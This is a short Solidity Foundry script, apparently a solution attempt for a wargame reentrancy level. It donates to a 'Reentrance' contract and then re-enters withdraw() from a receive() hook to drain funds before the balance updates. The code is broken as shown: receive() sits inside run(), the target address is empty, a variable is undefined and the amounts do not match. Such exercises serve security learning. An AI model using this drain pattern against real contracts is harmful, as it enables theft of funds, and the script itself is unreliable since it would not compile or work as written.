// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "../src/10_Reentrace.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract Reentrancy is Script {
    Reentrance public reentrance = Reentrance(payable());

    uint256 public i;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // Become a doner, 
        reentrance.donate{value: 0.001 ether}(address(this));
        // Then, Withdraw
        reentrance.withdraw(1);
        // Re-enter with receve() or fallback() before amout is deducted.
        receive() external payable {
            if (i == 0){
                console.log("Fist Amount received (from donation)");
                i++;
            } else {
                console.log("Re-entering withdraw again.");
                reentranceInstance.withdraw(0.1 ether);
            }
        
    }
        vm.stopBroadcast();        
    }
}


